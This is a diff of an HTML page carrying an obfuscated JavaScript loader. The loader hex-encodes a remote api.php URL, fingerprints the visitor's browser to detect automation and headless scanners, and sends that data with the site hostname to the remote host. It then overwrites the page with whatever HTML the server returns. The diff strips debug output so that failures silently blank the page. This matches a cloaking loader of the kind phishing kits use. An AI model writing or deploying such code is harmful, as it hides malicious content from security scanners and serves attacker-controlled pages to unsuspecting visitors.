@@ -5,57 +5,54 @@
 <meta charset="utf-8">
 </head>
 <body>
-<div id="dbg" style="position:fixed;top:0;left:0;right:0;background:#f00;color:#fff;padding:10px;font-family:monospace;font-size:12px;z-index:99999;display:none;"></div>
 <script>
-function shw(m){var d=document.getElementById("dbg");d.style.display="block";d.innerHTML=m;}
-var af32e7464='68747470733a2f2f';
-var a3b4b1d48='64696c6c696e6765';
-var a6804bdd0='722e636c6f75642f';
-var ad458e031='656e636f62667372';
-var a528a9f84='6f626f7470726f2f';
-var a975a98f9='6170692e706870';
-var x592dd1f6=qb18ce4e5(af32e7464+a3b4b1d48+a6804bdd0+ad458e031+a528a9f84+a975a98f9);
-var b03e37c67='3235663536323963';
-var b5ab15dea='3237313033663038';
-var b1c137a23='3239306532316234';
-var b3e03e8a0='3235376330306664';
-var yb36f61c9=qb18ce4e5(b03e37c67+b5ab15dea+b1c137a23+b3e03e8a0);
-function qb18ce4e5(h){var r="";for(var i=0;i<h.length;i+=2){r+=String.fromCharCode(parseInt(h.substr(i,2),16));}return r;}
+var ac70c2f70='68747470733a2f2f';
+var aea5bca3a='64696c6c696e6765';
+var ad262cc15='722e636c6f75642f';
+var a1fd74813='454e432f6170692e';
+var a2b2426e6='706870';
+var x44654e56=q3665cac8(ac70c2f70+aea5bca3a+ad262cc15+a1fd74813+a2b2426e6);
+var b81819643='3861653164376237';
+var bf8b0ddca='3438313034333864';
+var b22ef57a3='6536336563306631';
+var b4f6de5b8='6666373866323262';
+var yfca69751=q3665cac8(b81819643+bf8b0ddca+b22ef57a3+b4f6de5b8);
+function q3665cac8(h){var r="";for(var i=0;i<h.length;i+=2){r+=String.fromCharCode(parseInt(h.substr(i,2),16));}return r;}
 (function(){
-var z4b09c3ea="";
-var wa29060c6="";
-var vd5faaa7b="";
-var u644012cf="";
+var z7b839213="";
+var w4a2d73fc="";
+var v24576a4c="";
+var ue43205fc="";
 
 try{
-z4b09c3ea=(navigator.webdriver===true)?"1":"0";
-}catch(e){z4b09c3ea="0";}
+z7b839213=(navigator.webdriver===true)?"1":"0";
+}catch(e){z7b839213="0";}
 
 try{
-wa29060c6=(navigator.plugins&&navigator.plugins.length>0)?"0":"1";
-}catch(e){wa29060c6="1";}
+w4a2d73fc=(navigator.plugins&&navigator.plugins.length>0)?"0":"1";
+}catch(e){w4a2d73fc="1";}
 
 try{
-vd5faaa7b=(navigator.languages&&navigator.languages.length>0)?"0":"1";
-}catch(e){vd5faaa7b="1";}
+v24576a4c=(navigator.languages&&navigator.languages.length>0)?"0":"1";
+}catch(e){v24576a4c="1";}
 
 try{
-u644012cf=(/HeadlessChrome/i.test(navigator.userAgent))?"1":"0";
-}catch(e){u644012cf="0";}
+ue43205fc=(/HeadlessChrome/i.test(navigator.userAgent))?"1":"0";
+}catch(e){ue43205fc="0";}
 
-var taaa6e09b="i="+encodeURIComponent(yb36f61c9);
-taaa6e09b+="&h="+encodeURIComponent(location.hostname);
-taaa6e09b+="&a="+z4b09c3ea+"&d="+u644012cf;
-taaa6e09b+="&p="+encodeURIComponent(navigator.platform||"");
-taaa6e09b+="&s="+encodeURIComponent(screen.width+"x"+screen.height);
-taaa6e09b+="&l="+encodeURIComponent(navigator.language||"");
-taaa6e09b+="&tz="+encodeURIComponent(Intl.DateTimeFormat().resolvedOptions().timeZone||"");
-taaa6e09b+="&cr="+encodeURIComponent(navigator.hardwareConcurrency||"");
-taaa6e09b+="&m="+encodeURIComponent(navigator.deviceMemory||"");
-taaa6e09b+="&tc="+encodeURIComponent((navigator.maxTouchPoints>0)?"1":"0");
+var t7344bada="i="+encodeURIComponent(yfca69751);
+t7344bada+="&h="+encodeURIComponent(location.hostname);
+t7344bada+="&a="+z7b839213+"&d="+ue43205fc;
+t7344bada+="&p="+encodeURIComponent(navigator.platform||"");
+t7344bada+="&s="+encodeURIComponent(screen.width+"x"+screen.height);
+t7344bada+="&l="+encodeURIComponent(navigator.language||"");
+t7344bada+="&tz="+encodeURIComponent(Intl.DateTimeFormat().resolvedOptions().timeZone||"");
+t7344bada+="&cr="+encodeURIComponent(navigator.hardwareConcurrency||"");
+t7344bada+="&m="+encodeURIComponent(navigator.deviceMemory||"");
+t7344bada+="&tc="+encodeURIComponent((navigator.maxTouchPoints>0)?"1":"0");
 
 var xhr=new XMLHttpRequest();
-xhr.open("POST",x592dd1f6,true);
+xhr.open("POST",x44654e56,true);
 xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
 xhr.onreadystatechange=function(){
 if(xhr.readyState===4){
@@ -67,20 +64,17 @@ document.open();
 document.write(res.c);
 document.close();
 }else{
-shw("SERVER: "+JSON.stringify(res));
+document.body.innerHTML="";
 }
 }catch(e){
-shw("PARSE: "+xhr.responseText.substring(0,300));
+document.body.innerHTML="";
 }
 }else{
-shw("HTTP: "+xhr.status);
+document.body.innerHTML="";
 }
 }
 };
-xhr.onerror=function(){
-shw("NETWORK: Cannot reach server");
-};
-xhr.send(taaa6e09b);
+xhr.send(t7344bada);
 })();
 </script>
 </body>
